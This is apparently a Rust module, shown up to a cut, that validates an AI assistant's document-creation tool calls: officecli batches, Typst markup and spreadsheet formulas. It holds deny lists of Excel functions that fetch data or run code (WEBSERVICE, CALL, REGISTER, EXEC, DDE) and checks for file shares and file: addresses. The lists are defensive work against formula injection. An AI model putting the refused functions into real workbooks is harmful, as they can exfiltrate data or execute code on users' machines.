//! `create_document`, the host side: the model writes the content, the host
//! makes the file with a bundled engine in a private folder of the
//! conversation, checks it and keeps it as a generated attachment of the
//! reply. The result names the file's path and its first page's preview for
//! the runtime alone (see `assistant-runtime/src/document-tools.mjs`).
//!
//! What the engines print reaches the model and the reply's card only through
//! [`Work::shown`]: without the document's folder and without anything that
//! looks like a credential.
use super::{
    engines::Engines,
    fix,
    runner::{run_engine, EngineOutput, ENGINE_TIMEOUT, OUTPUT_LIMIT, TYPST_PACKAGES},
};
use crate::services::assistant::{
    attachments,
    host::{blocking, scrub_secrets, scrub_secrets_in, AssistantHost, RunControl, PROTOCOL},
    media::UNKNOWN,
    media_tools::host::{fingerprint, still_running, MediaRun},
    store::AssistantStore,
    types::{id, now, MediaRecord},
};
use serde::{Deserialize, Serialize};
use serde_json::{json, Map, Value};
use std::path::{Path, PathBuf};
use std::sync::Arc;
use std::time::Duration;

/// The engine failed, or refused the content; the message says why.
pub const FAILED: &str = "assistant_document_failed";
/// The reply already made [`MAX_DOCUMENTS_PER_RUN`] documents.
pub const LIMIT: &str = "assistant_document_limit";
/// `content` is over [`MAX_CONTENT_BYTES`].
pub const TOO_LARGE: &str = "assistant_document_too_large";
/// The format's engine is not on this computer.
const DISABLED: &str = "assistant_capability_disabled";
/// The most documents one reply may make.
pub const MAX_DOCUMENTS_PER_RUN: usize = 3;
/// The longest `content`, serialized.
pub const MAX_CONTENT_BYTES: usize = 2 * 1024 * 1024;
/// The most commands one Office document's batch may hold.
const MAX_COMMANDS: usize = 2000;
const MAX_NAME_CHARS: usize = 120;
/// The most issues a result and its card keep.
const MAX_ISSUES: usize = 20;
const MAX_ISSUE_CHARS: usize = 500;
const MAX_PATH_CHARS: usize = 200;
/// The runtime passes the model at most 2000 characters of an error: the
/// failure has to fit, its code included.
const MAX_ERROR_CHARS: usize = 1900;
/// An officecli failure lists this many of its failed commands, each in at
/// most [`MAX_FAILURE_CHARS`] characters of output.
const MAX_LISTED_FAILURES: usize = 5;
const MAX_FAILURE_CHARS: usize = 220;
/// How many problems `view issues` lists before identical ones are counted
/// together and the most important [`MAX_ISSUES`] are kept: 200 issues are
/// about 80 KB of JSON, well inside the runner's [`OUTPUT_LIMIT`] (a report
/// cut there would lose every issue).
const VIEW_ISSUES_LIMIT: &str = "200";
/// The issue a document gets when `view issues` gave no report: no count of
/// problems is not the same as none.
const ISSUES_UNAVAILABLE: &str =
    "issues unavailable: officecli did not report the document's formatting and content problems";
/// Page setup, fonts and heading styles; the model writes only the body.
const PRELUDE: &str = include_str!("pdf-prelude.typ");
const MAIN: &str = "main.typ";
const BATCH: &str = "batch.json";
/// The engines' home and temp folder, inside the document's folder.
const HOME: &str = ".home";

#[derive(Debug, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct CreateDocumentArgs {
    pub name: String,
    pub format: DocumentFormat,
    pub content: Value,
}

#[derive(Clone, Copy, Debug, Deserialize, PartialEq, Eq)]
#[serde(rename_all = "lowercase")]
pub enum DocumentFormat {
    Pptx,
    Docx,
    Xlsx,
    Pdf,
    Md,
    Txt,
    Csv,
    Html,
    Json,
}

/// What makes a format's file.
#[derive(Clone, Copy, PartialEq, Eq)]
enum Engine {
    Office,
    Typst,
    /// Written as the model wrote it.
    Text,
}

impl DocumentFormat {
    pub fn extension(self) -> &'static str {
        match self {
            Self::Pptx => "pptx",
            Self::Docx => "docx",
            Self::Xlsx => "xlsx",
            Self::Pdf => "pdf",
            Self::Md => "md",
            Self::Txt => "txt",
            Self::Csv => "csv",
            Self::Html => "html",
            Self::Json => "json",
        }
    }

    fn engine(self) -> Engine {
        match self {
            Self::Pptx | Self::Docx | Self::Xlsx => Engine::Office,
            Self::Pdf => Engine::Typst,
            _ => Engine::Text,
        }
    }

    /// What a file of this format is counted in, when it is.
    fn count(self) -> Option<&'static str> {
        match self {
            Self::Pptx => Some("slides"),
            Self::Xlsx => Some("sheets"),
            Self::Pdf => Some("pages"),
            _ => None,
        }
    }

    /// The file the engine writes in the document's folder. The model's name
    /// is only the attachment's: it never reaches an engine's arguments.
    fn file(self) -> String {
        format!("out.{}", self.extension())
    }
}

/// A call whose arguments passed the checks.
#[derive(Clone)]
struct Document {
    name: String,
    format: DocumentFormat,
    content: Content,
}

#[derive(Clone)]
enum Content {
    /// An officecli batch.
    Commands(Vec<Value>),
    /// Typst markup, or the text of a text file.
    Text(String),
}

impl Document {
    fn new(args: CreateDocumentArgs) -> Result<Self, String> {
        let size = serde_json::to_vec(&args.content)
            .map_err(|_| PROTOCOL)?
            .len();
        if size > MAX_CONTENT_BYTES {
            return Err(refuse(
                TOO_LARGE,
                format!("content is {size} bytes, over the 2 MiB limit; make the document shorter"),
            ));
        }
        let format = args.format;
        let extension = format.extension();
        let content = match (format.engine(), args.content) {
            (Engine::Office, Value::Array(mut commands)) => {
                check_batch(&mut commands, format)?;
                unescape_newlines(&mut commands);
                if format == DocumentFormat::Xlsx {
                    check_formulas(&commands)?;
                }
                Content::Commands(commands)
            }
            (Engine::Office, _) => {
                return Err(refuse(
                    FAILED,
                    format!("{extension} content must be an array of officecli batch commands"),
                ))
            }
            (Engine::Typst, Value::String(body)) if imports_a_package(&body) => {
                return Err(refuse(
                    FAILED,
                    "Typst packages are not available: write the body without #import or #include of \"@…\" packages",
                ))
            }
            (Engine::Typst, Value::String(body)) => Content::Text(body),
            (Engine::Typst, _) => {
                return Err(refuse(FAILED, "pdf content must be a string of Typst markup"))
            }
            (Engine::Text, Value::String(text)) => Content::Text(text),
            (Engine::Text, _) => {
                return Err(refuse(
                    FAILED,
                    format!("{extension} content must be a string with the file's text"),
                ))
            }
        };
        Ok(Self {
            name: file_name(&args.name, format),
            format,
            content,
        })
    }
}

/// The `sandbox-exec` an engine runs under, kept once a probe showed the
/// engine works there. A failed probe is not kept: the next document tries
/// again, and only the first failure is logged.
#[derive(Default)]
pub struct EngineSandbox {
    works: tokio::sync::OnceCell<PathBuf>,
    warned: std::sync::atomic::AtomicBool,
}

impl EngineSandbox {
    /// Log why there is no sandbox, the first time only.
    fn warn_once(&self, why: &str) {
        if !self.warned.swap(true, std::sync::atomic::Ordering::Relaxed) {
            log::warn!("[Assistant] {why}");
        }
    }
}

/// The commands a batch may hold: they change the document and nothing else.
/// The host validates and views the file itself.
const COMMANDS: &[&str] = &["add", "set", "remove", "move", "swap"];
/// The fields a command may carry (`op` is officecli's alias of `command`,
/// `path2` the second element of a swap).
const FIELDS: &[&str] = &[
    "command", "op", "parent", "path", "path2", "type", "props", "after", "before", "index",
    "from", "to", "selector",
];
/// The fields that name an element of the document, never a file.
const ELEMENT_FIELDS: &[&str] = &[
    "parent", "path", "path2", "after", "before", "from", "to", "selector",
];
/// Properties officecli reads as a file (`officecli help`: `src` and its
/// alias `path`, a fill or cell `image`, an OLE `preview`, a picture
/// `fallback`, a media `poster`), and names a file could go by: a data URI
/// only. A dotted key is a file's when any part of it is.
const FILE_KEYS: &[&str] = &[
    "src", "path", "image", "preview", "fallback", "poster", "file", "source", "icon", "logo",
    "video", "audio", "model", "ole",
];
/// Click targets: a web or mail address, or an element of the document.
const LINK_KEYS: &[&str] = &["link", "hyperlink", "url", "href"];
/// Prose: any value, so that text may hold addresses and slashes. Only
/// these exact keys.
const PROSE_KEYS: &[&str] = &[
    "text",
    "title",
    "notes",
    "alt",
    "description",
    "tooltip",
    "value",
    "formula",
];
/// Names a sheet may not root an element path with: file systems' first
/// folders.
const FOLDER_NAMES: &[&str] = &[
    "users",
    "volumes",
    "windows",
    "program files",
    "programdata",
    "applications",
    "library",
    "system",
    "private",
    "etc",
    "var",
    "tmp",
    "usr",
    "bin",
    "opt",
    "home",
    "root",
    "mnt",
    "media",
    "dev",
    "proc",
    "sys",
    "boot",
    "srv",
    "run",
    "sbin",
    "lib",
    "cores",
    "snap",
    "nix",
];
/// The first segment of an element path, besides a sheet's name.
const ROOTS: &[&str] = &[
    "body",
    "header",
    "footer",
    "comments",
    "footnotes",
    "endnotes",
    "styles",
    "settings",
    "numbering",
    "theme",
    "slide",
    "slidemaster",
    "slidelayout",
    "notes",
    "sheet",
];

/// What a property may hold.
#[derive(Clone, Copy, PartialEq, Eq)]
enum Property {
    File,
    Link,
    /// A deck's table or chart data, or its chart categories, inline,
    /// checked as a whole (see [`data_reaches_out`]).
    Data,
    /// A workbook's or document's table data, inline, checked cell by cell
    /// too (see [`cells_reach_out`]).
    Cells,
    Prose,
    /// A fill, gradient or background: colours, a gradient, or an image.
    Fill,
    NumberFormat,
    Other,
}

/// The class of a property by its key, in a document of `format`. A deck's
/// `data` and chart `categories` are checked as a whole: officecli 1.0.160
/// reads a table's data as a file only when the whole value names one.
fn property(key: &str, format: DocumentFormat) -> Property {
    let key = key.to_ascii_lowercase();
    let last = key.rsplit('.').next().unwrap_or(&key);
    let deck = format == DocumentFormat::Pptx;
    if key.split('.').any(|part| FILE_KEYS.contains(&part)) {
        Property::File
    } else if LINK_KEYS.contains(&last) {
        Property::Link
    } else if deck && matches!(key.as_str(), "data" | "categories") {
        Property::Data
    } else if key == "data" {
        Property::Cells
    } else if PROSE_KEYS.contains(&key.as_str()) {
        Property::Prose
    } else if matches!(last, "gradient" | "background") || last.ends_with("fill") {
        Property::Fill
    } else if matches!(key.as_str(), "numberformat" | "numfmt") {
        Property::NumberFormat
    } else {
        Property::Other
    }
}

/// The props a batch writes prose with line breaks into. A literal `\n` (a
/// backslash and an n, as a model writes one when it escapes twice) is a
/// newline in them, as officecli's own command line reads it; `batch`
/// would keep it as written.
const NEWLINE_KEYS: &[&str] = &["text", "notes"];

/// Literal `\n` and `\r\n` sequences in the prose of `commands`, as newlines.
fn unescape_newlines(commands: &mut [Value]) {
    for command in commands.iter_mut() {
        let Some(props) = command.get_mut("props").and_then(Value::as_object_mut) else {
            continue;
        };
        for (key, value) in props.iter_mut() {
            let key = key.to_ascii_lowercase();
            if !NEWLINE_KEYS.contains(&key.as_str()) {
                continue;
            }
            if let Value::String(text) = value {
                if text.contains("\\n") {
                    *text = text.replace("\\r\\n", "\n").replace("\\n", "\n");
                }
            }
        }
    }
}

/// A batch officecli may run on a document of `format`: commands that
/// change the document, whose values read nothing outside the document's
/// folder and fetch nothing (a picture or any other file comes as a `data:`
/// URI), with no diagram or embedded object, and Word fields that only show
/// a page number or a date (see [`refused_shape`]).
pub(super) fn check_batch(commands: &mut [Value], format: DocumentFormat) -> Result<(), String> {
    if commands.is_empty() {
        return Err(refuse(
            FAILED,
            "the batch is empty: content must hold at least one command",
        ));
    }
    if commands.len() > MAX_COMMANDS {
        return Err(refuse(
            FAILED,
            format!("at most {MAX_COMMANDS} commands per document"),
        ));
    }
    // The sheets an xlsx path may start with: the first one, and those the
    // batch adds or renames.
    let mut sheets = vec!["sheet1".to_owned()];
    for (index, item) in commands.iter_mut().enumerate() {
        let problem = |why: &str| refuse(FAILED, format!("item {index}: {why}"));
        let Some(fields) = item.as_object_mut() else {
            return Err(problem(
                "each command is an object with a \"command\" field",
            ));
        };
        let verb = match (
            fields.get("command").and_then(Value::as_str),
            fields.get("op").and_then(Value::as_str),
        ) {
            (Some(verb), None) | (None, Some(verb)) => verb.to_ascii_lowercase(),
            (Some(verb), Some(op)) if verb.eq_ignore_ascii_case(op) => verb.to_ascii_lowercase(),
            _ => {
                return Err(problem(
                    "each command is an object with a \"command\" field",
                ))
            }
        };
        if !COMMANDS.contains(&verb.as_str()) {
            return Err(problem(&format!(
                "\"{verb}\" is not available; a batch uses {}",
                COMMANDS.join(", ")
            )));
        }
        if let Some(field) = fields.keys().find(|key| !FIELDS.contains(&key.as_str())) {
            return Err(problem(&format!(
                "unknown field \"{field}\"; a command takes {}",
                FIELDS.join(", ")
            )));
        }
        if let Some(why) = refused_shape(fields) {
            return Err(problem(&why));
        }
        for (field, value) in fields.iter() {
            let why = if ELEMENT_FIELDS.contains(&field.as_str()) {
                let anchor = matches!(field.as_str(), "after" | "before");
                match value {
                    Value::String(text) if names_an_element(text, anchor, &sheets) => None,
                    Value::Number(_) => None,
                    _ => Some((
                        field.clone(),
                        "must name an element of the document, such as /slide[1]/shape[2]",
                    )),
                }
            } else {
                // `props` by each key's class; `type` and the verb as others.
                refused_property(field.clone(), value, Property::Other, format)
            };
            if let Some((key, why)) = why {
                return Err(problem(&format!("\"{key}\" {why}")));
            }
        }
        let kind = element_type(fields);
        let name = fields
            .get("props")
            .and_then(|props| props.get("name"))
            .and_then(Value::as_str);
        let renamed = verb == "set"
            && fields
                .get("path")
                .and_then(Value::as_str)
                .and_then(|path| path.strip_prefix('/'))
                .is_some_and(|sheet| sheets.contains(&sheet.to_lowercase()));
        let added = verb == "add" && kind == "sheet";
        if let Some(name) = name.filter(|_| renamed || added) {
            // Said here: a later path under it would fail as a confusing
            // path error.
            if !may_root(name) {
                return Err(problem(&format!(
                    "sheet name \"{name}\" cannot be used as a path root; rename the sheet"
                )));
            }
            sheets.push(name.to_lowercase());
        }
    }
    Ok(())
}

/// The functions a workbook's formulas may call (R54): maths and rounding,
/// statistics, logic, text, lookup and reference, date and time, finance,
/// information and dynamic arrays. None reads outside the workbook or runs
/// anything; HYPERLINK only links, and only to one quoted address (see
/// [`hyperlink_addresses`]).
const FORMULA_ALLOWED: &[&str] = &[
    "SUM",
    "SUMIF",
    "SUMIFS",
    "SUMPRODUCT",
    "AVERAGE",
    "AVERAGEIF",
    "AVERAGEIFS",
    "MIN",
    "MAX",
    "COUNT",
    "COUNTA",
    "COUNTIF",
    "COUNTIFS",
    "COUNTBLANK",
    "IF",
    "IFS",
    "IFERROR",
    "IFNA",
    "AND",
    "OR",
    "NOT",
    "XOR",
    "ROUND",
    "ROUNDUP",
    "ROUNDDOWN",
    "INT",
    "MOD",
    "ABS",
    "SQRT",
    "POWER",
    "EXP",
    "LN",
    "LOG",
    "LOG10",
    "RANK",
    "LARGE",
    "SMALL",
    "MEDIAN",
    "STDEV",
    "STDEV.P",
    "STDEV.S",
    "VAR",
    "VAR.P",
    "VAR.S",
    "PERCENTILE",
    "QUARTILE",
    "TEXT",
    "VALUE",
    "LEN",
    "LEFT",
    "RIGHT",
    "MID",
    "TRIM",
    "UPPER",
    "LOWER",
    "PROPER",
    "CONCAT",
    "CONCATENATE",
    "TEXTJOIN",
    "SUBSTITUTE",
    "REPLACE",
    "FIND",
    "SEARCH",
    "REPT",
    "CHAR",
    "CODE",
    "VLOOKUP",
    "HLOOKUP",
    "XLOOKUP",
    "INDEX",
    "MATCH",
    "XMATCH",
    "CHOOSE",
    "ROW",
    "ROWS",
    "COLUMN",
    "COLUMNS",
    "OFFSET",
    "DATE",
    "TODAY",
    "NOW",
    "YEAR",
    "MONTH",
    "DAY",
    "HOUR",
    "MINUTE",
    "SECOND",
    "WEEKDAY",
    "EOMONTH",
    "EDATE",
    "DATEDIF",
    "NETWORKDAYS",
    "WORKDAY",
    "DAYS",
    "PMT",
    "PV",
    "FV",
    "NPV",
    "IRR",
    "RATE",
    "NPER",
    "ISBLANK",
    "ISNUMBER",
    "ISTEXT",
    "ISERROR",
    "N",
    "T",
    "UNIQUE",
    "SORT",
    "SORTBY",
    "FILTER",
    "SEQUENCE",
    "TRUE",
    "FALSE",
    "PI",
    "HYPERLINK",
];
/// The prefixes Excel stores newer functions under (`_xlfn.XLOOKUP`,
/// `_xlfn._xlws.SORT`).
const FUNCTION_PREFIXES: &[&str] = &["_XLFN.", "_XLWS."];
/// A second check (R50, R53): words a formula may not hold anywhere, quoted
/// text included, because they fetch from a server or another file
/// (WEBSERVICE, IMAGE, RTD, FILTERXML over what was fetched, STOCKHISTORY,
/// TRANSLATE, DETECTLANGUAGE, COPILOT, the IMPORT… functions), run code or
/// another program (CALL, REGISTER, REGISTER.ID, EXEC, PY, DDE), or read a
/// reference built from text (INDIRECT). Words end at a `.` too, so
/// `_xlfn.IMAGE` and `REGISTER.ID` are among them.
const FORMULA_FUNCTIONS: &[&str] = &[
    "WEBSERVICE",
    "IMAGE",
    "RTD",
    "CALL",
    "REGISTER",
    "EXEC",
    "FILTERXML",
    "STOCKHISTORY",
    "TRANSLATE",
    "DETECTLANGUAGE",
    "COPILOT",
    "IMPORTTEXT",
    "IMPORTCSV",
    "IMPORTDATA",
    "IMPORTRANGE",
    "IMPORTXML",
    "IMPORTHTML",
    "PY",
    "INDIRECT",
    "DDE",
];
/// Families refused by their names' start: CUBEVALUE, CUBEMEMBER, CUBESET…
/// read an OLAP server.
const FORMULA_FAMILIES: &[&str] = &["CUBE"];
/// The parts of a property's name (in lower case, without `-` and `_`) that
/// make it a formula wherever it is, besides any part that holds `formula`
/// (`formula1`, `arrayFormula`, `sharedFormula`…): a named range's `ref`
/// and `refersTo`, a pivot table's `calculatedField`.
const FORMULA_KEYS: &[&str] = &["ref", "refersto", "calculatedfield", "calculatedfields"];
/// On a [`FORMULA_TARGETS`] element, the properties that are text, by the
/// last part of their name (R59): read as a formula only when they start
/// like one, and otherwise only checked for what names a place outside the
/// workbook (see [`refused_reference`]). Every other property of such an
/// element is read as a formula.
const TEXT_KEYS: &[&str] = &[
    "title",
    "axistitle",
    "cattitle",
    "valtitle",
    "xtitle",
    "ytitle",
    "name",
    "seriesname",
    "legend",
    "label",
    "labels",
    "prompt",
    "error",
    "errortitle",
    "inputtitle",
    "prompttitle",
    "inputmessage",
    "errormessage",
    "header",
    "headers",
    "caption",
    "style",
    "numberformat",
    "numfmt",
    "format",
    "font",
    "color",
    "fill",
    "size",
    "bold",
    "italic",
];
/// The properties that hold an inline list, by the last part of their name
/// (R57): chart data and categories, a series' values, a table's columns,
/// a pivot table's fields (a sparkline's `data` is a reference). One
/// reference is read as a formula; on a [`FORMULA_TARGETS`] element, so is
/// a list that holds `!` or `|` (R62); any other list is checked cell by
/// cell (see [`refused_list`]).
const LIST_KEYS: &[&str] = &[
    "data",
    "categories",
    "values",
    "columns",
    "rows",
    "cols",
    "filters",
];
/// The xlsx elements whose references and values may be formulas without a
/// leading `=`, by `type` or in a path (`/Sheet1/cf[1]`), named in lower
/// case without `-` and `_`: conditional formats (a `cellis` value is a
/// formula), validations, named ranges (`name` is officecli's alias),
/// charts, sparklines, tables and pivot tables.
const FORMULA_TARGETS: &[&str] = &[
    "cf",
    "conditionalformatting",
    "aboveaverage",
    "cellis",
    "cfextended",
    "colorscale",
    "containstext",
    "databar",
    "dateoccurring",
    "duplicatevalues",
    "formulacf",
    "iconset",
    "topn",
    "uniquevalues",
    "validation",
    "datavalidation",
    "namedrange",
    "definedname",
    "name",
    "chart",
    "chartseries",
    "chartaxis",
    "sparkline",
    "table",
    "pivottable",
];
/// What starts a formula: Excel reads a leading `+`, `-` or `@` as `=`
/// (a value that is a number is none).
const FORMULA_STARTS: &[char] = &['=', '+', '-', '@'];
/// What a workbook file is named: a name before `!` that ends so refers to
/// another workbook.
const WORKBOOK_EXTENSIONS: &[&str] = &[
    ".xls", ".xlsx", ".xlsm", ".xlsb", ".xla", ".xlam", ".xlt", ".xltx", ".xltm", ".ods", ".csv",
];

/// The formulas of an xlsx batch (R50, R53, R54, R56, R57, R59, R62). A
/// formula key (see [`is_formula_key`]) is a formula whatever it holds. On
/// a [`FORMULA_TARGETS`] element, an inline list ([`LIST_KEYS`]) is checked
/// cell by cell unless it is one reference or holds `!` or `|` (then it is
/// a formula, made of references only), [`TEXT_KEYS`] are text, and any
/// other property is a formula. Anywhere else, a value that starts like a
/// formula is one. A formula calls only [`FORMULA_ALLOWED`] functions, holds
/// none of
/// [`FORMULA_FUNCTIONS`], no DDE link, no other workbook, and no file share
/// or address outside HYPERLINK's quoted link. A table's inline rows hold
/// values only. Excel evaluates what passes: formulas are filtered, not
/// sandboxed.
fn check_formulas(commands: &[Value]) -> Result<(), String> {
    for (index, item) in commands.iter().enumerate() {
        let Some(fields) = item.as_object() else {
            continue;
        };
        let targeted = holds_formulas(fields);
        // R62: a sparkline's `data` is officecli's alias of `dataRange`.
        let sparkline = names_element(fields, &["sparkline"]);
        let Some(props) = fields.get("props").and_then(Value::as_object) else {
            continue;
        };
        for (key, value) in props {
            let Some(text) = value.as_str() else {
                continue;
            };
            let name: String = key
                .chars()
                .filter(|c| !matches!(c, '-' | '_'))
                .collect::<String>()
                .to_ascii_lowercase();
            let parts: Vec<&str> = name.split('.').collect();
            let last = parts.last().copied().unwrap_or_default();
            let data = name == "data";
            let list =
                ((targeted && LIST_KEYS.contains(&last)) || data) && !(sparkline && last == "data");
            let why = if is_formula_key(&parts) {
                refused_formula(text)
            } else if list {
                if is_single_reference(text) {
                    refused_formula(text)
                } else if targeted && text.contains(['!', '|']) {
                    // R62: officecli writes such a list whole as the
                    // chart's formula.
                    refused_formula(text).or_else(|| {
                        (!text.split(',').all(is_single_reference))
                            .then(|| LIST_REFERENCES.to_owned())
                    })
                } else {
                    refused_list(text, data)
                }
            } else if targeted && !TEXT_KEYS.contains(&last) {
                refused_formula(text)
            } else if starts_like_a_formula(text) {
                refused_formula(text).map(|why| read_as_a_formula(text, &why, !targeted))
            } else if targeted {
                refused_reference(text)
            } else {
                None
            };
            if let Some(why) = why {
                return Err(refuse(
                    FAILED,
                    format!("item {index}: \"props.{key}\" {why}"),
                ));
            }
        }
    }
    Ok(())
}

/// Whether a property named by `parts` (its name in lower case, without `-`
/// and `_`, split at `.`) is a formula whatever it holds: a part holds
/// `formula`, or is one of [`FORMULA_KEYS`].
fn is_formula_key(parts: &[&str]) -> bool {
    parts
        .iter()
        .any(|part| part.contains("formula") || FORMULA_KEYS.contains(part))
}

/// Why text that starts like a formula is refused: it is read as one. In a
/// cell's value a leading apostrophe keeps it text (officecli stores
/// `'+1 555` as the text `+1 555`, marked for Excel to show as typed); the
/// text of a [`FORMULA_TARGETS`] element shows the apostrophe, so none is
/// offered there (R63).
fn read_as_a_formula(text: &str, why: &str, cell: bool) -> String {
    let first = text.trim_start().chars().next().unwrap_or('=');
    let read = format!("starts with {first}, so it is read as a formula, and it {why}");
    if cell {
        format!("{read}. To keep it as text, start the value with an apostrophe (') — Excel shows the text without it")
    } else {
        format!("{read}. Reword it so that it does not start with {first}")
    }
}

/// Whether Excel would read `text` as a formula: after any leading
/// whitespace it starts with one of [`FORMULA_STARTS`], and it is not a
/// number (`-3.5`).
fn starts_like_a_formula(text: &str) -> bool {
    text.trim_start().starts_with(FORMULA_STARTS) && text.trim().parse::<f64>().is_err()
}

/// Whether an item's values may be formulas without `=`: it names one of
/// [`FORMULA_TARGETS`] (see [`names_element`]).
fn holds_formulas(fields: &Map<String, Value>) -> bool {
    names_element(fields, FORMULA_TARGETS)
}

/// Whether an item's `type`, or a segment of a path it names (past the
/// sheet's name, when there are several), is one of `names` (in lower case,
/// without `-` and `_`). A path is read as officecli takes one:
/// `/Sheet1/cf[1]` and `Sheet1!cf[1]` alike.
fn names_element(fields: &Map<String, Value>, names: &[&str]) -> bool {
    let target = |name: &str| {
        let name: String = name
            .chars()
            .filter(|c| !matches!(c, '-' | '_'))
            .collect::<String>()
            .to_ascii_lowercase();
        names.contains(&name.trim())
    };
    let named = ELEMENT_FIELDS
        .iter()
        .filter_map(|field| fields.get(*field)?.as_str())
        .any(|path| {
            let segments: Vec<&str> = path
                .trim_start_matches('/')
                .split(['/', '!'])
                .map(|segment| segment.split('[').next().unwrap_or_default())
                .collect();
            let sheet = usize::from(segments.len() > 1);
            segments.iter().skip(sheet).any(|segment| target(segment))
        });
    named
        || fields
            .get("type")
            .and_then(Value::as_str)
            .is_some_and(target)
}

/// Whether `text` is one cell or range reference: `A1`, `$A$1:$B$9`,
/// `Sheet1!A1:B9`, `'My Sheet'!A1`.
fn is_single_reference(text: &str) -> bool {
    let text = text.trim();
    let cells = match text.rsplit_once('!') {
        Some((sheet, cells)) => {
            let named = match sheet
                .strip_prefix('\'')
                .and_then(|name| name.strip_suffix('\''))
            {
                Some(quoted) => !quoted.is_empty() && !quoted.replace("''", "").contains('\''),
                None => {
                    !sheet.is_empty()
                        && sheet
                            .chars()
                            .all(|c| c.is_alphanumeric() || matches!(c, '_' | '.'))
                }
            };
            if !named {
                return false;
            }
            cells
        }
        None => text,
    };
    let cell = |cell: &str| is_cell(&cell.replace('$', ""));
    match cells.split_once(':') {
        Some((start, end)) => cell(start) && cell(end),
        None => cell(cells),
    }
}

/// Why an inline list is refused, if it is: a cell (split at `,`, `;`, tabs
/// and line breaks) that names a place outside the workbook, or that starts
/// like a formula and is one that is refused. Table `data` holds values
/// only: any cell that starts like a formula is refused there.
fn refused_list(text: &str, data: bool) -> Option<String> {
    text.split([',', ';', '\t', '\n', '\r'])
        .map(|cell| cell.trim().trim_matches('"'))
        .find_map(|cell| {
            refused_reference(cell).or_else(|| {
                let formula = starts_like_a_formula(cell);
                let refused = formula.then(|| refused_formula(cell)).flatten();
                refused.or_else(|| (data && formula).then(|| DATA_VALUES.to_owned()))
            })
        })
        .map(|why| format!("has a cell that {why}"))
}

/// Why table rows that hold a formula are refused.
const DATA_VALUES: &str = "starts with =, +, - or @ and is not a number; table rows hold values only: set a formula with \"formula\" on its cell";
/// Why text that names another workbook is refused.
const OTHER_WORKBOOK: &str =
    "refers to another workbook or a file; a formula may refer only to this workbook's sheets";
/// Why text that names a file share or an address is refused.
const SHARE_OR_ADDRESS: &str = "names a file share or an address; only HYPERLINK's first argument may hold an https:, http: or mailto: address";
/// Why text that names a `file:` address is refused.
const FILE_ADDRESS: &str = "names a file: address; a formula cannot";
/// Why an inline list on a [`FORMULA_TARGETS`] element that holds a `!`
/// but is not a union of references is refused (R62/R66): officecli writes
/// a chart series list whole as its formula, so every list key is read
/// whole once it holds a `!`.
const LIST_REFERENCES: &str = "holds !, so the whole list is read as a formula, and it is not a union of references such as Sheet1!A2:A5,Sheet1!B2:B5; reword the label without ! or point the series at cells";

/// Whether `text` names a `file:` address: `file:`, in any case, where a
/// word starts (R64): at the start, or after a character that is not an
/// ASCII letter or digit. "Risk profile: by region" names none.
fn names_a_file_address(text: &str) -> bool {
    let lower = text.to_ascii_lowercase();
    lower.match_indices("file:").any(|(at, _)| {
        !lower[..at]
            .chars()
            .next_back()
            .is_some_and(|c| c.is_ascii_alphanumeric())
    })
}

/// Why text is refused for naming a place outside the workbook, if it is:
/// another workbook (`[book]Sheet!A1`, a quoted path before `!`), a file
/// share (`\\`), an address (`://`, a leading `//`) or a `file:` address
/// (see [`names_a_file_address`]). Text keeps its words and quotes: nothing
/// else is read as a formula.
fn refused_reference(text: &str) -> Option<String> {
    let why = if names_a_file_address(text) {
        FILE_ADDRESS
    } else if refers_to_another_workbook(text) {
        OTHER_WORKBOOK
    } else if text.contains("\\\\") || text.contains("://") || text.trim_start().starts_with("//") {
        SHARE_OR_ADDRESS
    } else {
        return None;
    };
    Some(why.into())
}

/// Why a formula is refused, if it is: a call of a function that is not
/// [`FORMULA_ALLOWED`] first, then checks that read the whole text, quoted
/// strings included.
fn refused_formula(text: &str) -> Option<String> {
    let code = match formula_code(text) {
        Ok(code) => code,
        Err(why) => return Some(why.into()),
    };
    if let Some(name) =
        called_functions(&code).find(|name| !FORMULA_ALLOWED.contains(&name.as_str()))
    {
        return Some(format!(
            "calls {name}, which a workbook made here cannot use: formulas may call maths, statistics, logic, text, lookup, date, finance and information functions (SUM, IF, IFERROR, VLOOKUP, XLOOKUP, TEXT, DATE, PMT, ISNUMBER…), and HYPERLINK with one quoted https:, http:, mailto: or # address"
        ));
    }
    let words = || {
        text.split(|c: char| !(c.is_ascii_alphanumeric() || c == '_'))
            .filter(|word| !word.is_empty())
            .map(str::to_ascii_uppercase)
    };
    let refused = |word: &String| {
        FORMULA_FUNCTIONS.contains(&word.as_str())
            || FORMULA_FAMILIES
                .iter()
                .any(|family| word.starts_with(family))
    };
    if let Some(name) = words().find(refused) {
        return Some(format!(
            "names {name}: a formula cannot hold a function that fetches, runs code or builds a reference from text (WEBSERVICE, IMAGE, INDIRECT, DDE, STOCKHISTORY, CUBE…, IMPORT…, PY and others), even in quoted text"
        ));
    }
    if text.contains('|') {
        return Some(
            "holds |, which Excel reads as a link to another program (DDE); a formula cannot hold |, even in quoted text"
                .into(),
        );
    }
    if names_a_file_address(text) {
        return Some(FILE_ADDRESS.into());
    }
    let Some(addresses) = hyperlink_addresses(text) else {
        return Some(
            "uses HYPERLINK without one quoted https:, http:, mailto: or # address as its first argument"
                .into(),
        );
    };
    if refers_to_another_workbook(text) {
        return Some(OTHER_WORKBOOK.into());
    }
    let mut outside = String::with_capacity(text.len());
    let mut from = 0;
    for address in addresses {
        outside.push_str(&text[from..address.start.max(from)]);
        outside.push(' ');
        from = address.end.max(from);
    }
    outside.push_str(&text[from..]);
    if outside.contains("\\\\") || outside.contains("//") {
        return Some(SHARE_OR_ADDRESS.into());
    }
    None
}

/// `text` as Excel reads its code: each quoted string, quoted sheet name
/// and bracketed table reference kept as its delimiters only (`""`, `''`,
/// `[]`), so that no word inside one reads as a call. Refused when one does
/// not pair up, or when a sheet name or a table reference holds a `"`:
/// where a string starts would then be in doubt.
fn formula_code(text: &str) -> Result<String, &'static str> {
    #[derive(Clone, Copy)]
    enum State {
        Code,
        Text,
        Name,
        Bracket(usize),
    }
    const UNPAIRED: &str = "has a quote or a bracket that does not pair up";
    const QUOTED: &str =
        "has a \" inside a sheet name or a table reference; a formula cannot hold one there";
    let mut code = String::with_capacity(text.len());
    let mut chars = text.chars().peekable();
    let mut state = State::Code;
    while let Some(c) = chars.next() {
        state = match (state, c) {
            (State::Code, '"') => {
                code.push('"');
                State::Text
            }
            (State::Code, '\'') => {
                code.push('\'');
                State::Name
            }
            (State::Code, '[') => {
                code.push('[');
                State::Bracket(1)
            }
            (State::Code, ']') => return Err(UNPAIRED),
            (State::Code, c) => {
                code.push(c);
                State::Code
            }
            (State::Text, '"') if chars.peek() == Some(&'"') => {
                chars.next();
